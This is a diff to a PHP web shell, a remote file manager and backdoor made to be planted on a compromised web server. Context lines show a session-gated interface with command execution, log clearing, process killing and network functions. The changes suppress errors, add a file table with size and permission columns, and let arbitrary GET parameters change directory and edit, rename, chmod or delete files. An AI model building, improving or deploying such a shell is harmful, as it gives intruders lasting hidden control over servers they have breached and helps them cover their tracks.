@@ -20,6 +20,7 @@
  * MA 02110-1301, USA.
  *
 */
+error_reporting(0);
 session_start();
 set_time_limit(0);
 ignore_user_abort(0);
@@ -159,7 +160,7 @@ if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ])) {
 	table,
 	tr,
 	td {
-		border: 1px;
+		border: 1px solid green;
 		-webkit-border: 1px;
 		-moz-border: 1px;
 		-o-border: 1px;
@@ -174,6 +175,12 @@ if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ])) {
 		-o-height:auto;
 		width:800px;
 		height:auto;
+	}
+
+	th {
+		background:green;
+		padding:7px;
+		text-align:center;
 	}
 
 	nav {
@@ -885,6 +892,24 @@ function chmods($filename)
 	die();
 }
 
+function size($path)
+{
+    $bytes = sprintf('%u', filesize($path));
+
+    if ($bytes > 0)
+    {
+        $unit = intval(log($bytes, 1024));
+        $units = array('B', 'KB', 'MB', 'GB');
+
+        if (array_key_exists($unit, $units) === true)
+        {
+            return sprintf('%d %s', $bytes / pow(1024, $unit), $units[$unit]);
+        }
+    }
+
+    return $bytes;
+}
+
 function clear_logs()
 {
 	global $os;
@@ -1247,7 +1272,9 @@ function kill()
 	</div>
 </nav>
 <?php
-if(isset($_GET['do'])):
+if (isset($_GET['url'])) {
+	@chdir($_GET['url']);
+}
 	if ($_GET['do'] == 'home') {
 		home();
 	}
@@ -1273,16 +1300,13 @@ if(isset($_GET['do'])):
 		logout();
 	}
 	elseif ($_GET['do'] == 'edit' and isset($_GET['files'])) {
-		edit(base64_decode($_GET['files']));
-	}
-	elseif ($_GET['do'] == 'open' and isset($_GET['dir'])) {
-		chdir(base64_decode($_GET['dir']));
+		edit($_GET['files']);
 	}
 	elseif ($_GET['do'] == 'view' and isset($_GET['files'])) {
-		view(base64_decode($_GET['files']));
+		view($_GET['files']);
 	}
 	elseif ($_GET['do'] == 'delete' and isset($_GET['files'])) {
-		if (@hapus(base64_decode($_GET['files']))) {
+		if (@hapus($_GET['files'])) {
 			alert("Success");
 		}
 		else {
@@ -1290,10 +1314,10 @@ if(isset($_GET['do'])):
 		}
 	}
 	elseif ($_GET['do'] == 'rename' and isset($_GET['files'])) {
-		renames(base64_decode($_GET['files']));
+		renames($_GET['files']);
 	}
 	elseif ($_GET['do'] == 'chmod' and isset($_GET['files'])) {
-		chmods(base64_decode($_GET['files']));
+		chmods($_GET['files']);
 	}
 	elseif ($_GET['do'] == 'cmd') {
 		cmd_ui();
@@ -1311,10 +1335,10 @@ if(isset($_GET['do'])):
 		short_link();
 	}
 	elseif ($_GET['do'] == 'new' and isset($_GET['dir'])) {
-		newdir(base64_decode($_GET['dir']));
+		newdir($_GET['dir']);
 	}
 	elseif($_GET['do'] == 'touch' and isset($_GET['files'])) {
-		newfile(base64_decode($_GET['files']));
+		newfile($_GET['files']);
 	}
 	elseif ($_GET['do'] == 'network') {
 		network();
@@ -1322,50 +1346,106 @@ if(isset($_GET['do'])):
 	elseif ($_GET['do'] == 'kill') {
 		kill();
 	}
+	?>
+	<table width='70%' cellpadding='3' cellspacing='3' align='center'>
+	<th>Name</th>
+	<th>Size</th>
+	<th>Permission</th>
+	<th>Action</th>
+	<?php
+foreach (scandir(getcwd()) as $dir) {
+	if(!is_dir($dir)) continue;
+	if ($dir === '.' || $dir === '..') {
+		$tools = "<center>
+		<a class='btn btn-success btn-xs' href='?do=touch&files=".base64_encode(getcwd() . $sep . dirname($dir))."'>New File</a>
+		<a class='btn btn-success btn-xs' href='?do=new&dir=".base64_encode(getcwd() . $sep . $dir)."'>New Dir</a>";
+	} else {
+		$tools = "<center>
+		<a class='btn btn-success btn-xs' href='?do=chmod&url=" .base64_encode(getcwd())."&files=".$dir."'>Chmod</a>
+		<a class='btn btn-success btn-xs' href='?do=rename&url=" .base64_encode(getcwd())."&files=".$dir."'>Rename</a> 
+		<a class='btn btn-success btn-xs' href='?do=delete&url=" .base64_encode(getcwd())."&files=".$dir."'>Delete</a></td>";
+	}
+		echo "<tr><td><img src='https://cvar1984.github.io/Blank-Folder-icon.png' class='icon'> ";
+		echo " <a href='?url=".@getcwd().$sep.$dir."'>".$dir."</a></td>";
+		echo "<td><center>--</center></td>";
+		echo "<td><center>";
+		echo "".@writable($dir, @perms($dir))."</center></td>";
+		echo "<td>".$tools."</td>";
+	}
+	print("<tr><td colspan='4'></td></tr>");
+	foreach (@scandir(@getcwd()) as $file) {
+		if(!is_file($file)) continue;
+		echo "<tr><td><img src='https://cvar1984.github.io/text-plain-icon.png' class='icon'> ";
+		echo " <a href='?do=edit&url=".base64_encode(getcwd())."&files=".$file."'>$file</a></td>";
+		echo "<td><center>".@size($file)."</center></td>";
+		echo "<td><center>";
+		echo "".@writable($file, @perms($file))."</center></td>";
+		echo "<td><center>
+		<a class='btn btn-success btn-xs' href='?do=chmod&url=".base64_encode(getcwd())."&files=".$file."'>Chmod</a>
+		<a class='btn btn-success btn-xs' href='?do=rename&files=".base64_encode(getcwd() . $sep . $file)."'>Rename</a> 
+		<a class='btn btn-success btn-xs' href='?do=delete&files=".base64_encode(getcwd() . $sep . $file)."'>Delete</td>";
+	}
+function perms($file) {
+$perms = fileperms($file);
+switch ($perms & 0xF000) {
+    case 0xC000: // socket
+        $info = 's';
+        break;
+    case 0xA000: // symbolic link
+        $info = 'l';
+        break;
+    case 0x8000: // regular
+        $info = 'r';
+        break;
+    case 0x6000: // block special
+        $info = 'b';
+        break;
+    case 0x4000: // directory
+        $info = 'd';
+        break;
+    case 0x2000: // character special
+        $info = 'c';
+        break;
+    case 0x1000: // FIFO pipe
+        $info = 'p';
+        break;
+    default: // unknown
+        $info = 'u';
+}
 
-endif;
-echo "<table width='70%' cellpadding='3' cellspacing='3' align='center' style='background:green;'>
-	<th style='background:green;float:left;width:200px;text-align:center;font-size:18px;'>Name</th>
-	<th style='background:green;float:right;width:300px;text-align:center;font-size:18px;'>Action</th>
-	</table>";
-foreach (scandir(getcwd()) as $dir):
-echo "<table width='70%' class='table-hover' align='center'>
-		<tr>";
-	$ext = pathinfo($dir, PATHINFO_EXTENSION);
-	if (is_dir($dir)) {
-		echo "<td><img src='https://cvar1984.github.io/Blank-Folder-icon.png' class='icon'>";
-		echo "<a href='?do=open&dir=".base64_encode(getcwd().$sep.$dir)."'>$dir</a></td>";
-		echo "<td style='float:right;margin-right:7px;'>
-		<a class='btn btn-success btn-xs' href='?do=touch&files=".base64_encode(getcwd() . $sep . dirname($dir))."'>New File</a>
-		<a class='btn btn-success btn-xs' href='?do=new&dir=".base64_encode(getcwd() . $sep . $dir)."'>New Dir</a>
-		<a class='btn btn-success btn-xs' href='?do=chmod&files=" .base64_encode(getcwd() . $sep . $dir)."'>Chmod</a>
-		<a class='btn btn-success btn-xs' href='?do=rename&files=" .base64_encode(getcwd() . $sep . $dir)."'>Rename</a> 
-		<a class='btn btn-success btn-xs' href='?do=delete&files=" .base64_encode(getcwd() . $sep . $dir)."'>Delete</td>";
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+            (($perms & 0x0800) ? 's' : 'x' ) :
+            (($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+            (($perms & 0x0400) ? 's' : 'x' ) :
+            (($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+            (($perms & 0x0200) ? 't' : 'x' ) :
+            (($perms & 0x0200) ? 'T' : '-'));
+
+echo $info;
+}
+function writable($dir, $perms) {
+	if(!is_writable($dir)) {
+		return "<font color=red>".$perms."</font>";
+	} else {
+		return "<font color=green>".$perms."</font>";
 	}
-	elseif ($ext == 'jpg' or $ext == 'jpeg') {
-		echo "<td><img src='https://cvar1984.github.io/text-plain-icon.png' class='icon'>";
-		echo "<a href='?do=view&files=".base64_encode(getcwd().$sep.$dir)."'>$dir</a></td>";
-		echo "<td style='float:right;margin-right:7px;'>
-		<a class='btn btn-success btn-xs' href='?do=touch&files=".base64_encode(getcwd() . $sep . dirname($dir))."'>New File</a>
-		<a class='btn btn-success btn-xs' href='?do=new&dir=".base64_encode(getcwd() . $sep . dirname($dir))."'>New Dir</a>
-		<a class='btn btn-success btn-xs' href='?do=chmod&files=" .base64_encode(getcwd() . $sep . $dir)."'>Chmod</a>
-		<a class='btn btn-success btn-xs' href='?do=rename&files=" .base64_encode(getcwd() . $sep . $dir). "'>Rename</a> 
-		<a class='btn btn-success btn-xs' href='?do=delete&files=" .base64_encode(getcwd() . $sep . $dir). "'>Delete</td>";
-	}
-	else {
-		echo "<td><img src='https://cvar1984.github.io/text-plain-icon.png' class='icon'>";
-		echo "<a href='?do=edit&files=".base64_encode(getcwd() . $sep . $dir) . "'>$dir</a></td>";
-		echo "<td style='float:right;margin-right:7px;'>
-		<a class='btn btn-success btn-xs' href='?do=touch&files=".base64_encode(getcwd() . $sep . dirname($dir)) . "'>New File</a>
-		<a class='btn btn-success btn-xs' href='?do=new&dir=".base64_encode(getcwd() . $sep . dirname($dir))."'>New Dir</a>
-		<a class='btn btn-success btn-xs' href='?do=chmod&files=".base64_encode(getcwd() . $sep . $dir)."'>Chmod</a>
-		<a class='btn btn-success btn-xs' href='?do=rename&files=".base64_encode(getcwd() . $sep . $dir)."'>Rename</a> 
-		<a class='btn btn-success btn-xs' href='?do=delete&files=".base64_encode(getcwd() . $sep . $dir)."'>Delete</td>";
-	}
+}
 ?>
 	</tr>
 	</table>
-<?php endforeach;?>
 <table width='70%' cellpadding='3' cellspacing='3' align='center'
 		style='background: green;'>
 		<th style='padding: 5px;' colspan='2'>
